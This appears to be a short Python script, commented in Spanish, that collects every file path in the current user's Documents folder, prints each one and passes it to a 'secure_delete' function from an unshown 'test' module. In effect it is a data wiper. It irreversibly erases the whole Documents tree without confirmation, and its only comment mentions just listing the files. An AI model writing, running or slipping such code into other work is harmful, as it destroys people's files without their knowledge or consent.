import os
import test


archivos = []
# Para listar los archivos en la carpeta Documents del usuario
def listar_archivos_documentos(lista):
    documentos_path = os.path.join(os.environ["USERPROFILE"], "Documents")
    for root, _, files in os.walk(documentos_path):
        for file in files:
            lista.append(os.path.join(root, file))

listar_archivos_documentos(archivos)

for archivo in archivos:
    print(archivo)
    test.secure_delete(archivo)